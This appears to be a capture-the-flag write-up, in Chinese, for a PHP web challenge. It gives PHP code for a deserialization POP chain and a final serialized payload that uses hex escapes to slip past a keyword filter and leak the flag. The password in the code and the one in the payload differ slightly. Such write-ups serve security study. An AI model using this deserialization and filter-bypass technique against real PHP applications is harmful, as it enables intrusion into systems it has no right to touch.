# Password Game

> 分类：Web

## 题目描述

密码游戏满足 4 个规则后得到 PHP 反序列化源码。filter 过滤 `admin`/`2024qwb`（用十六进制绕过），构造 POP 链：root::__get 修改 value 为 flag，通过引用让 user::username 指向 root::value，触发 user::__destruct 输出 flag。

## 考察知识点

- PHP 反序列化 POP 链
- preg_replace 过滤绕过（十六进制 / 大写 S）

## 解法

1. 通过 4 个规则得到源码：filter 用 `preg_replace("/admin|2024qwb/i","nonono")` 过滤。
2. `root::__get` 中 `strpos($this->username,"admin")==0 && $this->value=="2024qwb"` 时 `$this->value = $GLOBALS["flag"]`。
3. 绕过过滤：用十六进制 `\61dmin`、`2024qw\62`（大写 S 转义）。
4. 构造 POP 链：

```php
<?php
class root { public $username; public $value; }
class user { public $username; public $password; public $value; }
$a = new root();
$b = new user();
$b->username = &$a->value;  // 引用
$b->password = "admin19060";
$a->username = $b;
$a->value = "2024qwb";
echo serialize($a);
```

最终 payload：

```
O:4:"root":2:{s:8:"username";O:4:"user":3:{s:8:"username";S:7:"2024qw\62";s:8:"password";S:11:"\61dmin190607";s:5:"value";N;}s:5:"value";R:3;}
```

## 参考答案

（flag 通过 root::__get + user::__destruct 引用链输出）

## 来源

- 作者：yemaster | https://blog.yemaster.cn/post/123
- 作者：狼组安全团队 | https://cn-sec.com/archives/3354853.html
